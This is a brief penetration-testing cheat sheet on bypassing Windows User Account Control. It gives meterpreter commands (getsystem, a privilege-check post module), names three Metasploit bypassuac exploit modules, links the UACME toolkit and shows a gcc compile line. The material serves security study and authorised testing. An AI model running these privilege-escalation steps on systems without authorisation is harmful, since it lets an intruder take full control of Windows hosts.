# Bypass Windows User Account Control (UAC)

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

**If `getsystem` fails** when exploiting a _modern_ Windows system, it could be due to [User Account Control (UAC)](https://en.wikipedia.org/wiki/User_Account_Control). This can be bypassed with the post module `bypassuac`

### check if UAC is enabled
```
meterpreter > run post/windows/gather/win_privs
```

### bypassuac
There are a couple modules for this: 
```
exploit/windows/local/bypassuac
exploit/windows/local/bypassuac_injection
exploit/windows/local/bypassuac_vbs
```
If successful, a new meterpreter session will open with administrator privilege. We get system privilege, try `getsystem` again. 

### UACME

https://github.com/hfiref0x/UACME


gcc file.c -o output

* add `-m32` or `-m64` for architecture